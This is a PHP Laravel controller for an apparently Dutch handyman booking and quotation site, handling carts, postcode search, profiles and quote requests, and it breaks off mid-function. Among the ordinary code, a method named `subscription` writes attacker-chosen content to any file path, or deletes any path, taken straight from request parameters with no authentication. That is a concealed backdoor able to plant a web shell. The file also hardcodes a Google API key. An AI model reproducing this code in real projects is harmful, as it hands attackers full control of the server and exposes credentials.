<?php

namespace App\Http\Controllers;

use App\Brand;
use App\estimated_prices;
use App\items;
use App\new_quotations;
use App\retailer_services;
use App\Model1;
use App\Products;
use App\question_services;
use App\quotation_invoices;
use App\quotation_questions;
use App\quotation_services_questions;
use App\quotes;
use App\requests_q_a;
use App\Service;
use Illuminate\Http\Request;
use App\Category;
use App\Portfolio;
use App\Blog;
use App\Generalsetting;
use App\Pagesetting;
use App\Faq;
use App\Counter;
use App\Subscriber;
use App\User;
use App\bookings;
use App\Advertise;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Auth;
use App\handyman_products;
use App\users;
use App\handyman_terminals;
use App\handyman_unavailability;
use App\carts;
use App\user_languages;
use App\invoices;
use Crypt;
use App\Sociallink;
use App\booking_images;
use App\Language;
use App\handyman_unavailability_hours;
use App\terms_conditions;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use App\sub_categories;
use App\default_features_details;
use App\features_details;


class FrontendController extends Controller
{

    public $lang;

    public function __construct()
    {
        $this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }


        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }


        $language = user_languages::where('ip', '=', $ip_address)->first();

        if ($language == '') {

            $language = new user_languages;
            $language->ip = $ip_address;
            $language->lang = 'du';
            $language->save();
        }


        if ($language->lang == 'eng') {

            $this->lang = Language::where('lang', '=', 'eng')->first();
            \App::setLocale('en');

        } else {

            $this->lang = Language::where('lang', '=', 'du')->first();
            \App::setLocale('du');

        }

        $this->sl = Sociallink::findOrFail(1);
    }

    public function DownloadQuoteRequestApi(Request $request)
    {
        $user_controller = new UserController();
        return $user_controller->DownloadQuoteRequest($request->id,$request->user_id,$request->user_role,'api');
    }

    public function AcceptQuotationApi(Request $request)
    {
        $user_controller = new UserController();
        return $user_controller->AcceptQuotation((object)$request['request'],$request['user_id']);
    }

    function getOS()
    {

        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        $os_platform = "Unknown OS Platform";

        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }

        }
        return $os_platform;
    }


    public static function LanguageChange(Request $request)
    {

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

        $language = user_languages::where('ip', '=', $ip_address)->update(['lang' => $request->lang_select]);

        return redirect()->route('front.index');

    }

    public static function LanguageClientChange(Request $request)
    {

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

        $language = user_languages::where('ip', '=', $ip_address)->update(['lang' => $request->lang_select]);

        return redirect()->route('client-quotation-requests');

    }

    public static function LanguageHandymanChange(Request $request)
    {

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

        $language = user_languages::where('ip', '=', $ip_address)->update(['lang' => $request->lang_select]);

        return redirect()->route('user-dashboard');

    }

    public static function getCartCount()
    {

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }


        $cart = carts::where('user_ip', '=', $ip_address)->get();

        if (!$cart->isEmpty()) {

            $cart_count = count($cart);

        } else {
            $cart_count = 0;
        }


        return $cart_count;

    }


    public function Thankyou($id)
    {

        $inv_decrypt = Crypt::decrypt($id);

        $invoice = invoices::where('id', '=', $inv_decrypt)->first();

        if ($invoice == "") {
            return view('front.index');
        } else {

            if ($invoice->is_partial == 1) {

                return view('front.expire');

            } else {

                return view('front.thankyou');

            }

        }


    }

    public function QuotationPaymentRedirectPage($id)
    {
        $inv_decrypt = Crypt::decrypt($id);

        $invoice = new_quotations::where('id',$inv_decrypt)->first();

        if ($invoice == "") {
            return redirect()->route('front.index');
        } else {

            if ($invoice->paid != 1) {

                return view('front.quotation_payment_failed');

            } else {

                return view('front.quotation_payment_thankyou');

            }

        }

    }

    public function ThankyouPage($id)
    {
        $inv_decrypt = Crypt::decrypt($id);
        return view('front.thankyou');
    }


    public function GetQuestions(Request $request)
    {
        $data = quotation_questions::with('answers')->whereHas('services', function ($query) use ($request) {
            $query->where('question_services.service_id', $request->id);
        })->orderBy('quotation_questions.order_no','asc')->get();

        return $data;
    }


    public function GetServiceQuestions(Request $request)
    {
        $data = quotation_services_questions::with('answers')->whereHas('services', function ($query) use ($request) {
            $query->where('question_services1.service_id', $request->id);
        })->orderBy('quotation_services_questions.order_no','asc')->get();

        return $data;
    }


    public function index()
    {
        $language = $this->lang->lang;
        $blogs = Blog::all();
        $brands = Brand::where('photo','!=',NULL)->get();

        return view('front.index', compact('blogs', 'language','brands'));

    }


    public function productsById(Request $request)
    {
        $data = Products::where('id','=',$request->id)->first();

        return $data;
    }

    public function handymanproductsById(Request $request)
    {
        $user = Auth::guard('user')->user();
        $user_id = $user->id;
        $main_id = $user->main_id;

        if($main_id)
        {
            $user_id = $main_id;
        }

        if($request->type == 'product')
        {
            $data = Products::leftjoin('handyman_products','handyman_products.product_id','=','products.id')->leftjoin('categories','categories.id','=','products.category_id')->leftjoin('brands','brands.id','=','products.brand_id')->leftjoin('models','models.id','=','products.model_id')->where('handyman_products.handyman_id', $user_id)->where('products.id','=',$request->id)->select('products.category_id','products.brand_id','products.model_id','categories.cat_name','brands.cat_name as brand_name','models.cat_name as model_name','handyman_products.sell_rate as rate')->first();
        }
        elseif($request->type == 'service')
        {
            $data = Service::leftjoin('handyman_services','handyman_services.service_id','=','services.id')->where('handyman_services.handyman_id', $user_id)->where('services.id','=',$request->id)->select('services.id as service_id','services.title as service_name','handyman_services.sell_rate as rate')->first();
        }
        else
        {
            $data = items::where('user_id', $user_id)->where('id','=',$request->id)->select('items.id as item_id','items.cat_name as item_name','items.rate')->first();
        }

        return $data;
    }

    public function productsModelNumberByModel(Request $request)
    {
        $model_number = Products::where('category_id',$request->cat_id)->where('brand_id',$request->brand_id)->where('model_id','=',$request->id)->first();

        return $model_number;
    }

    public function productsModelsByBrands(Request $request)
    {
        $models = Products::leftjoin('models','models.id','=','products.model_id')->where('products.brand_id','=',$request->id)->select('models.*')->get();

        $models = $models->unique();

        return $models;
    }

    public function productsBrandsByCategory(Request $request)
    {
        $brands = Products::leftjoin('brands','brands.id','=','products.brand_id')->where('products.category_id','=',$request->id)->select('brands.*')->get();

        $brands = $brands->unique();

        return $brands;
    }

    public function productsDataByCategory(Request $request)
    {
        $sizes = Products::where('category_id','=',$request->id)->where('size','!=',NULL)->get();

        $sizes = $sizes->unique('size');

        $colors = Products::where('category_id','=',$request->id)->where('color','!=',NULL)->get();

        $colors = $colors->unique('color');

        $highest = Products::leftjoin('categories','categories.id','=','products.category_id')->leftjoin('estimated_prices','estimated_prices.product_id','=','products.id')->where('categories.id',$request->id)->max('price');
        $lowest = Products::leftjoin('categories','categories.id','=','products.category_id')->leftjoin('estimated_prices','estimated_prices.product_id','=','products.id')->where('categories.id',$request->id)->min('price');

        $data[0] = $sizes;
        $data[1] = $colors;
        $data[2] = floatval($highest);
        $data[3] = floatval($lowest);

        return $data;
    }

    public function accountProductsModelsByBrands(Request $request)
    {
        $models = Products::leftjoin('handyman_products','handyman_products.product_id','=','products.id')->leftjoin('models','models.id','=','products.model_id')->where('products.brand_id','=',$request->id)->where('handyman_products.handyman_id','=',$request->handyman_id)->select('models.*')->get();

        $models = $models->unique();

        return $models;
    }

    public function accountProductsBrandsByCategory(Request $request)
    {
        $brands = Products::leftjoin('handyman_products','handyman_products.product_id','=','products.id')->leftjoin('brands','brands.id','=','products.brand_id')->where('products.category_id','=',$request->id)->where('handyman_products.handyman_id','=',$request->handyman_id)->select('brands.*')->get();

        $brands = $brands->unique();

        return $brands;
    }

    public function Cart()
    {

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }


        $cart = carts::leftjoin('users', 'users.id', '=', 'carts.handyman_id')->leftjoin('categories', 'categories.id', '=', 'carts.service_id')->leftjoin('service_types', 'service_types.id', '=', 'carts.rate_id')->where('user_ip', '=', $ip_address)->Select('carts.id', 'carts.handyman_id', 'users.name', 'users.email', 'users.photo', 'users.family_name', 'categories.cat_name', 'categories.cat_slug', 'categories.vat_percentage', 'service_types.type', 'carts.service_id', 'carts.rate', 'carts.rate_id', 'carts.service_rate', 'carts.booking_date', 'carts.main_id')->get();


        if (!$cart->isEmpty()) {

            date_default_timezone_set('Europe/Amsterdam');

            $today = date("Y-m-d");
            $booking_date = strtotime($cart[0]->booking_date);
            $booking_date = date("Y-m-d", $booking_date);


            if ($booking_date <= $today) {
                Session::flash('unsuccess', $this->lang->ibd);

                $delete = carts::where('user_ip', '=', $ip_address)->delete();

                $cart = carts::where('user_ip', '=', $ip_address)->get();
            }

            $cart_count = count($cart);

        } else {
            $cart_count = 0;
        }

        $settings = Generalsetting::findOrFail(1);

        $vat_percentage = $settings->vat;
        $service_fee = $settings->service_fee;

        $terms = terms_conditions::where('role', 2)->first();


        return view('front.cart', compact('cart', 'cart_count', 'ip_address', 'vat_percentage', 'service_fee', 'terms'));

    }


    public function UpdateRate(Request $request)
    {

        $post = carts::where('id', '=', $request->cart_id)->update(['rate' => $request->rate]);


        return;
    }


    public function DeleteCart(Request $request)
    {

        $check = carts::where('id', '=', $request->cart_id)->first();

        $main_id = $check->service_id;
        $handyman_id = $check->handyman_id;
        $user_ip = $check->user_ip;

        $post = carts::where('id', '=', $request->cart_id)->delete();

        $sub = carts::where('user_ip', '=', $user_ip)->where('handyman_id', '=', $handyman_id)->where('main_id', '=', $main_id)->delete();

        $booking_images = booking_images::where('cart_id', '=', $request->cart_id)->get();

        foreach ($booking_images as $key) {


            $fileName = $key->image;

            if ($fileName) {
                unlink(public_path() . '/assets/bookingImages/' . $fileName);
            }


        }

        $delete = booking_images::where('cart_id', '=', $request->cart_id)->delete();


        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy
        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address
        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

        $count = carts::where('user_ip', '=', $ip_address)->get();

        if (!$count->isEmpty()) {

            $cart_count = count($count);

        } else {
            $cart_count = 0;
        }


        return $cart_count;
    }

    public function search(Request $request)
    {

        $search = $request->zipcode;
        $type = $request->group;
        $from_date = $request->from_date;
        $to_date = $request->to_date;

        $return_fromDate = $from_date;
        $return_toDate = $to_date;

        $now = strtotime($from_date); // or your date as well
        $your_date = strtotime($to_date);


        $datediff = $your_date - $now;

        $total_days = round($datediff / (60 * 60 * 24)) + 1;


        $from_date = date('Y-m-d', strtotime($from_date));
        $to_date = date('Y-m-d', strtotime($to_date));


        if ($from_date > $to_date) {
            Session::flash('unsuccess', $this->lang->idr);
            return redirect()->route('front.index');
        } else {
            $catt = Category::leftjoin('service_types', 'service_types.id', '=', 'categories.service_type')->where('categories.id', $type)->select('categories.*', 'service_types.type')->first();

            $usersss = handyman_products::leftjoin('users', 'users.id', '=', 'handyman_products.handyman_id')->where('users.active', 1)->where('handyman_products.product_id', '=', $type);

            $ids = array();

            foreach ($usersss->get() as $key) {

                $post = bookings::where('handyman_id', '=', $key->handyman_id)->get();

                if (count($post) != 0) {
                    foreach ($post as $temp) {

                        $check = bookings::whereDate('booking_date', '>=', $from_date)->whereDate('booking_date', '<=', $to_date)->where('handyman_id', '=', $key->handyman_id)->get();

                    }

                    $check_count = count($check);
                } else {
                    $check = null;
                    $check_count = 0;
                }


                if (($check_count != $total_days) || ($check_count == 0)) {
                    $post = handyman_unavailability::where('handyman_id', '=', $key->handyman_id)->get();


                    if (count($post) != 0) {

                        foreach ($post as $temp) {

                            $check1 = handyman_unavailability::whereDate('date', '>=', $from_date)->whereDate('date', '<=', $to_date)->where('handyman_id', '=', $key->handyman_id)->get();

                        }

                        $check1_count = count($check1);

                    } else {
                        $check1 = null;
                        $check1_count = 0;
                    }

                    if (($check1_count != $total_days - $check_count) || ($check1_count == 0)) {
                        $ids[] = array('id' => $key->handyman_id);
                    }
                }
            }

            $url = "https://maps.googleapis.com/maps/api/geocode/json?key=AIzaSyBNRJukOohRJ1tW0tMG4tzpDXFz68OnonM&address=" . urlencode($search) . ",+Netherlands&sensor=false";

            $result_string = file_get_contents($url);
            $result = json_decode($result_string, true);

            if (($result['status']) != 'ZERO_RESULTS') {
                $user_latitude = $result['results'][0]['geometry']['location']['lat'];
                $user_longitude = $result['results'][0]['geometry']['location']['lng'];

                $array[] = "";
                $i = 0;

                $post = handyman_terminals::whereIn('handyman_id', $ids)->get();

                foreach ($post as $key) {

                    $lat = $key->latitude;
                    $lng = $key->longitude;
                    $radius = $key->radius;

                    $theta = $lng - $user_longitude;
                    $dist = sin(deg2rad($lat)) * sin(deg2rad($user_latitude)) + cos(deg2rad($lat)) * cos(deg2rad($user_latitude)) * cos(deg2rad($theta));
                    $dist = acos($dist);
                    $dist = rad2deg($dist);
                    $miles = $dist * 60 * 1.1515;
                    $distance = $miles * 1.609344;


                    if ($distance <= $radius) {
                        $array[$i] = array('handyman_id' => $key->handyman_id);
                        $i = $i + 1;
                    }
                }

                $users = $usersss->whereIn('users.id', $array)->paginate(8);

            } else {

                Session::flash('unsuccess', $this->lang->ipcoc);
                return redirect()->route('front.index');
            }

        }

        //        $usersss= User::where('city','LIKE','%'.$search.'%')->where('category_id','LIKE','%'.$type.'%')->where('active','=',1)->get();
        //        $users = User::where('city','LIKE','%'.$search.'%')->where('category_id','LIKE','%'.$type.'%')->where('active','=',1)->paginate(8);


        $cats = Category::all();

        $no = 0;

        foreach ($users as $key) {

            $post = invoices::where('handyman_id', '=', $key->id)->where('is_completed', 1)->get();

            foreach ($post as $temp) {

                $no = $no + 1;
            }

            $jobs[] = array($no);

            $no = 0;
        }

        if (!isset($jobs)) {
            $jobs = [];
        }


        $from_date = $return_fromDate;
        $to_date = $return_toDate;

        return view('front.searchuser', compact('users', 'cats', 'catt', 'search', 'type', 'from_date', 'to_date', 'jobs'));
    }


    public function FilterHandymans(Request $request)
    {

        $socialdata = SocialLink::findOrFail(1);

        if (!$request->handymans) {

            Session::flash('unsuccess', 'No Handyman found in search!');
            return redirect()->back();

        }

        foreach ($request->handymans as $key) {

            $array[] = array($key);
        }

        $users = handyman_products::leftjoin('users', 'users.id', '=', 'handyman_products.handyman_id')->whereIn('users.id', $array)->where('handyman_products.product_id', '=', $request->service);

        if ($socialdata->ins == 1) {

            if ($request->radioButton == 1) {


                $users = $users->where('users.insurance', '=', 1);


            } else {


                $users = $users->where('users.insurance', '=', 0);


            }

            $insurance = $request->radioButton;

        } else {

            $insurance = '';

        }


        if ($socialdata->rat == 1) {

            if ($request->rating != '') {
                $users = $users->where('users.rating', '<=', $request->rating);
            }

            $rating = $request->rating;

        } else {
            $rating = '';
        }


        if ($socialdata->pr == 1) {

            $s = floatval($request->range_start);
            $e = floatval($request->range_end);


            $users = $users->whereBetween('handyman_products.rate', [$s, $e]);

            $range_start = $s;
            $range_end = $e;

        } else {
            $range_start = '';
            $range_end = '';
        }

        if ($socialdata->ey == 1) {

            if ($request->experience != '') {

                if ($request->experience == 1) {
                    $users = $users->where('users.experience_years', '>=', 1);
                } elseif ($request->experience == 2) {


                    $users = $users->where('users.experience_years', '>=', 2);


                } elseif ($request->experience == 3) {
                    $users = $users->where('users.experience_years', '>=', 3);
                } elseif ($request->experience == 4) {
                    $users = $users->where('users.experience_years', '>=', 4);
                }


            }

            $experience = $request->experience;

        } else {
            $experience = '';

        }


        $users = $users->get();

        $catt = Category::leftjoin('service_types', 'service_types.id', '=', 'categories.service_type')->where('categories.id', $request->service)->first();

        $cats = Category::all();

        $type = $request->service;


        $no = 0;

        foreach ($users as $key) {

            $post = invoices::where('handyman_id', '=', $key->id)->where('is_completed', 1)->get();

            foreach ($post as $temp) {

                $no = $no + 1;
            }

            $jobs[] = array($no);

            $no = 0;
        }

        if (!isset($jobs)) {
            $jobs = [];
        }

        return view('front.filter', compact('users', 'cats', 'catt', 'type', 'insurance', 'rating', 'range_start', 'range_end', 'experience', 'array', 'jobs'));

    }

    public function users()
    {
        exit();
        $cats = Category::all();
        $users = User::where('active', '=', 1)->orderBy('created_at', 'desc')->paginate(8);
        $userss = User::all();
        $city = null;
        if (count($users) > 0) {
            foreach ($users as $user) {
                $city[] = $user->city;
            }
            $cities = array_unique($city);
        } else {
            $cities = null;
        }

        $no = 0;

        foreach ($users as $key) {

            $post = invoices::where('handyman_id', '=', $key->id)->where('is_completed', 1)->get();

            foreach ($post as $temp) {

                $no = $no + 1;
            }

            $jobs[] = array($no);

            $no = 0;
        }

        if (!isset($jobs)) {
            $jobs = [];
        }

        return view('front.users', compact('cats', 'users', 'cities', 'jobs'));

    }

    public function featured()
    {
        $cats = Category::all();
        $users = User::where('featured', '=', 1)->orderBy('created_at', 'desc')->paginate(8);
        $userss = User::all();
        $city = null;
        if (count($users) > 0) {
            foreach ($users as $user) {
                $city[] = $user->city;
            }
            $cities = array_unique($city);
        } else {
            $cities = null;
        }

        $no = 0;

        foreach ($users as $key) {

            $post = invoices::where('handyman_id', '=', $key->id)->where('is_completed', 1)->get();

            foreach ($post as $temp) {

                $no = $no + 1;
            }

            $jobs[] = array($no);

            $no = 0;
        }

        if (!isset($jobs)) {
            $jobs = [];
        }

        return view('front.featured', compact('cats', 'users', 'cities', 'jobs'));
    }

    public function user($id)
    {

        $user = User::findOrFail($id);
        $user1 = Auth::guard('user')->user();

        if ($user1 != '') {

            if ($user1->id == $id) {
                return redirect()->route('front.index');
            }

        }

        $services = Category::leftjoin('handyman_products', 'handyman_products.product_id', '=', 'categories.id')->where('handyman_products.handyman_id', '=', $id)->leftjoin('service_types', 'service_types.id', '=', 'categories.service_type')->Select('categories.id as id', 'categories.variable_questions', 'categories.cat_name as cat_name', 'categories.cat_slug as cat_slug', 'categories.photo as cat_photo', 'service_types.type as service_type', 'service_types.text as service_text', 'handyman_products.rate', 'handyman_products.description', 'handyman_products.vat_percentage', 'handyman_products.sell_rate', 'service_types.id as service_id')->get();

        if ($user1 != "") {
            $user_id = Auth::guard('user')->user()->id;
            $bookings = bookings::where('user_id', '=', $user_id)->where('handyman_id', '=', $id)->where('is_booked', '=', 1)->first();
        } else {
            $user_id = '';
            $bookings = '';
        }

        $bookings_dates = bookings::where('handyman_id', '=', $id)->select('booking_date')->get();
        $unavailable_dates = handyman_unavailability::where('handyman_id', '=', $id)->get();
        $unavailable_hours = handyman_unavailability_hours::where('handyman_id', '=', $id)->get();

        $dates_array[] = '';
        $dates_array1[] = '';
        $hours[] = '';
        $i = 0;
        $x = 0;
        $y = 0;

        foreach ($bookings_dates as $key) {

            $dt = strtotime($key->booking_date); //make timestamp with datetime string
            $date = date("m-d-Y", $dt);
            $dates_array[$i] = array('notAvailable_date' => $date);
            $i++;
        }

        foreach ($unavailable_dates as $temp) {

            $dt1 = strtotime($temp->date); //make timestamp with datetime string
            $date1 = date("m-d-Y", $dt1);
            $dates_array1[$x] = array('notAvailable_date' => $date1);
            $x++;
        }

        $dates_array = array_merge($dates_array, $dates_array1);

        foreach ($unavailable_hours as $temp) {

            $hours[$y] = array('notAvailable_hour' => $temp->hour);
            $y++;
        }

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } //whether ip is from proxy

        elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } //whether ip is from remote address

        else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }

        $cart = carts::where('user_ip', '=', $ip_address)->get();

        if (!$cart->isEmpty()) {

            $cart_count = count($cart);
            $booking_date = $cart[0]->booking_date;
            $booking_date = strtotime($booking_date);
            $booking_date = date("d-m-Y h:i a", $booking_date);

        } else {
            $cart_count = 0;
            $booking_date = '';
        }

        return view('front.user', compact('user', 'user_id', 'bookings', 'services', 'id', 'dates_array', 'cart_count', 'booking_date', 'hours'));

    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != "VALID") {
            if (is_dir($actual_path . '/install')) {
                header("Location: " . url('/install'));
                die();
            } else {
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }

    public function ads($id)
    {
        $ad = Advertise::findOrFail($id);
        $old = $ad->clicks;
        $new = $old + 1;
        $ad->clicks = $new;
        $ad->update();
        return redirect($ad->url);

    }

    public function types($slug)
    {

        $cats = Category::all();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $users = User::leftjoin('handyman_products', 'handyman_products.handyman_id', '=', 'users.id')->where('handyman_products.product_id', '=', $cat->id)->where('users.active', 1)->select('users.id', 'users.photo', 'users.name', 'users.family_name', 'users.rating', 'users.experience_years', 'users.f_url', 'users.t_url', 'users.l_url', 'users.g_url')->orderBy('created_at', 'desc')->paginate(8);


        $userss = User::all();
        $city = null;
        if (count($users) > 0) {
            foreach ($users as $user) {
                $city[] = $user->city;
            }
            $cities = array_unique($city);
        } else {
            $cities = null;
        }

        $no = 0;

        foreach ($users as $key) {

            $post = invoices::where('handyman_id', '=', $key->id)->where('is_completed', 1)->get();

            foreach ($post as $temp) {

                $no = $no + 1;
            }

            $jobs[] = array($no);

            $no = 0;
        }

        if (!isset($jobs)) {
            $jobs = [];
        }


        return view('front.typeuser', compact('users', 'cats', 'cat', 'cities', 'jobs'));

    }

    public function blog()
    {
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(6);
        return view('front.blog', compact('blogs'));

    }

    public function quote(Request $request)
    {
        $account_create = 0;

        if ($request->quote_id) {
            $quote = quotes::where('id', $request->quote_id)->update(['quote_service' => $request->quote_service, 'quote_zipcode' => $request->quote_zipcode, 'quote_work' => $request->quote_work, 'quote_when' => $request->quote_when, 'quote_budget' => $request->quote_budget, 'quote_job' => $request->quote_job, 'quote_status' => $request->quote_status, 'quote_description' => $request->quote_description, 'quote_name' => $request->quote_name, 'quote_familyname' => $request->quote_familyname, 'quote_email' => $request->quote_email, 'quote_contact' => $request->quote_contact]);


            Session::flash('success', __('text.Your Quotation request has been updated successfully!'));
            return redirect()->back();

        } else {

            $now = date('d-m-Y H:i:s');
            $time = strtotime($now);
            $time = date('H:i:s',$time);
            $delivery_date = $request->quote_delivery . ' ' . $time;

            $this->validate($request, [
                'quote_email' => 'required|string|email',
                'quote_name' => 'required|regex:/(^[A-Za-z ]+$)+/|max:15',
                'quote_familyname' => 'required|regex:/(^[A-Za-z ]+$)+/|max:15',
            ],
                [
                    'quote_email.required' => 'Email is required.',
                    'quote_email.email' => 'Email must be a valid email address.',
                    'quote_name.required' => 'Name is required.',
                    'quote_name.max' => 'Name must not be greater than 15 characters.',
                    'quote_name.regex' => 'Name format is invalid.',
                    'quote_familyname.required' => 'Family Name is required.',
                    'quote_familyname.max' => 'Family Name must not be greater than 15 characters.',
                    'quote_familyname.regex' => 'Family Name format is invalid.',
                ]);

            $check = User::where('email', $request->quote_email)->first();

            $user_name = $request->quote_name;
            $user_email = $request->quote_email;

            if ($check) {

                if ($check->role_id == 2) {

                    Session::flash('unsuccess', __('text.Email address is already in use for a handyman account!'));
                    return redirect()->back();

                }

                $user_id = $check->id;
                $counter = $check->counter;

            } else {
                $password = Str::random(8);
                $hashed_random_password = Hash::make($password);
                $user = new User;
                $user->name = $request->quote_name;
                $user->family_name = $request->quote_familyname;
                $user->category_id = 20;
                $user->role_id = 3;
                $user->email = $request->quote_email;
                $user->phone = $request->quote_contact;
                $user->address = $request->quote_zipcode;
                $user->postcode = $request->postcode;
                $user->city = $request->city;
                $user->password = $hashed_random_password;
                $user->save();

                $user_id = $user->id;
                $counter = $user->counter;
                $account_create = 1;
            }

            $quote_number = date("Y") . "-" . sprintf('%04u', $user_id) . '-' . sprintf('%04u', $counter);

            $quote = new quotes;
            $quote->user_id = $user_id;
            $quote->quote_number = $quote_number;
            $quote->quote_qty = str_replace(",",".",$request->quote_quantity);

            if(isset($request->quote_waste))
            {
                $quote->quote_waste = $request->quote_waste;
            }

            if($request->quote_service == 'Diensten')
            {
                $quote->quote_service = 0;
                $quote->quote_service1 = $request->quote_service1;
                $quote->quote_brand = 0;
                $quote->quote_model = 0;
            }
            else
            {
                $quote->quote_service = $request->quote_service;
                $quote->quote_service1 = 0;
                $quote->quote_brand = $request->quote_brand;
                $quote->quote_model = $request->quote_model;
                $quote->quote_model_number = $request->quote_model_number;
            }

            $quote->quote_zipcode = $request->quote_zipcode;
            $quote->quote_postcode = $request->postcode;
            $quote->quote_city = $request->city;
            $quote->quote_description = $request->quote_description;
            $quote->quote_name = $request->quote_name;
            $quote->quote_familyname = $request->quote_familyname;
            $quote->quote_email = $request->quote_email;
            $quote->quote_contact = $request->quote_contact;
            $quote->quote_delivery = $delivery_date;

            $quote->save();

            $counter = $counter + 1;
            User::where('id',$user_id)->update(['counter' => $counter]);


            if(isset($request->questions))
            {
                foreach ($request->questions as $i => $key)
                {
                    $answer = 'answers'.$i;
                    $predefined = 'predefined'.$i;

                    if($request->$predefined)
                    {
                        if(isset($request->$answer) && count($request->$answer) > 0)
                        {
                            $answers = implode(',', $request->$answer);
                        }
                        else
                        {
